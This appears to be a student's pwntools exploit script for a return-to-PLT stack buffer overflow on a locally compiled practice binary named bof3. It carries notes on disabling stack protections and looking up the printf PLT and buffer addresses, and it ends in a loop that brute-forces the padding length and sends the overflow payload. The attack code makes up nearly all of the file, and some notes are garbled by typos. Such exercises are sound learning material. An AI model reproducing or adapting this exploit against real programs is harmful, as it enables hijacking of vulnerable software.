from pwn import *
"""

# return to plt 
[+] Gcc Compile (include plt)
gcc -g -Wall -m32 -o bof3 bof3.c 
-fno-stack-protector -mpreferred-stack-boundary=2 
-z execstack -no-pie -I -static

[+] find plt function
Book code :
  objdump -d -M intel -j .plt --no bof3

Actually command:
  objdump -d -M intel  bof3 | grep plt

Example plt is printf function : 08049080

[+] find bss variable
readelf -s bof3 | grerp bufferr
: 0804c060

"""

printf_plt_address = p32(0x8049080)
buffer_var_address = p32(0x804c060)


for x in range(36,44):
	p = process("./bof3")
	payload = b"a" * x
	payload += printf_plt_address
	payload += b"BBBB"
	payload += buffer_var_address

	p.sendline(payload)
		
	result = p.recvall()
	print(result)
	

	p.close()
